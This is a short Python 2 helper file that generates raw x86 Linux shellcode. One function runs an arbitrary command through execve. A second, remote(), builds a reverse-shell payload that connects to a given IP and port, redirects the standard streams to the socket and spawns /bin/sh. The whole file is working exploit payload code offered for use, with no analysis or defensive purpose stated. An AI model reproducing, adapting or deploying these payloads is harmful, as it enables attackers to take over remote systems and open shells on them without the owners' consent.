# -*- coding:utf-8 -*-

import struct

def execve(cmd) :
    cmd = ('/' * (4 - (len(cmd) % 4))) + cmd # add padding
    pushCmdStrAsm = ""
    for i in xrange(len(cmd) / 4) :
        pushCmdStrAsm = "\x68" + cmd[i * 4 : (i + 1) * 4] + pushCmdStrAsm
        
    return ("\x31\xc0"              + #xor    %eax,%eax
            "\x50"                  + #push   %eax
            pushCmdStrAsm           + #push   cmd string on stack
            "\x89\xe3"              + #mov    %esp,%ebx
            "\x50"                  + #push   %eax
            "\x53"                  + #push   %ebx
            "\x89\xe1"              + #mov    %esp,%ecx
            "\x89\xc2"              + #mov    %eax,%edx
            "\xb0\x0b"              + #mov    $0xb,%al
            "\xcd\x80")               #int    $0x80
    # execve(cmd, [cmd, 0], 0)

def remote(ipStr, portNum) :
    IP = "".join(chr(int(num)) for num in ipStr.split('.'))
    PORT = struct.pack(">H", int(portNum))

    return ("\x68" + IP             + #push   IP
            "\x5e"                  + #pop    esi
            "\x66\x68" + PORT       + #pushw  PORT
            "\x5f"                  + #pop    edi
            "\x6a\x66"              + #push   0x66
            "\x58"                  + #pop    eax
            "\x99"                  + #cdq
            "\x6a\x01"              + #push   0x1
            "\x5b"                  + #pop    ebx
            "\x52"                  + #push   edx
            "\x53"                  + #push   ebx
            "\x6a\x02"              + #push   0x2
            "\x89\xe1"              + #mov    ecx,esp   <──┐
            "\xcd\x80"              + #int    0x80         │
            "\x93"                  + #xchg   ebx,eax      │
            "\x59"                  + #pop    ecx          │
            "\xb0\x3f"              + #mov    al,0x3f  <─┐ │
            "\xcd\x80"              + #int    0x80       │ │
            "\x49"                  + #dec    ecx        │ │
            "\x79\xf9"              + #jns    -0x5      ─┘ │
            "\xb0\x66"              + #mov    al,0x66      │
            "\x56"                  + #push   esi          │
            "\x66\x57"              + #push   di           │
            "\x66\x6a\x02"          + #pushw  0x2          │
            "\x89\xe1"              + #mov    ecx,esp      │
            "\x6a\x10"              + #push   0x10         │
            "\x51"                  + #push   ecx          │
            "\x53"                  + #push   ebx          │
            "\x89\xe1"              + #mov    ecx,esp      │
            "\xcd\x80"              + #int    0x80         │
            "\xb0\x0b"              + #mov    al,0xb       │
            "\x52"                  + #push   edx          │
            "\x68\x2f\x2f\x73\x68"  + #push   0x68732f2f   │
            "\x68\x2f\x62\x69\x6e"  + #push   0x6e69622f   │
            "\x89\xe3"              + #mov    ebx,esp      │
            "\x52"                  + #push   edx          │
            "\x53"                  + #push   ebx          │
            "\xeb\xce")               #jmp    -0x30       ─┘

